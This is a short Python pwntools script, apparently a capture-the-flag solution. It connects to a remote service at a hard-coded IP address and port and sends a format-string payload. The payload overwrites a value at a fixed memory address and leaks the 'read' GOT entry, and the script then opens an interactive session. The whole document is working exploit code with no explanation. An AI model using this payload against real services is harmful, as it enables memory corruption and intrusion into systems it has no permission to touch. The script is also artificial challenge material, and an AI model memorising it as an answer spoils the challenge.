from pwn import *

io = connect("39.96.193.120", 10000)
target_value_addr = 0x0804C030

elf = ELF("./attachment-9")
read_got = elf.got["read"]
put_got = elf.got["puts"]
payload = b"%5c%7$n%8$sa" + p32(target_value_addr) + p32(read_got)
io.recvuntil(b"Hope you have a good time here.\n")
io.sendline(payload)
raw = io.recv(10)
leaked = u32(raw[5:9])
print(hex(leaked))

io.interactive()
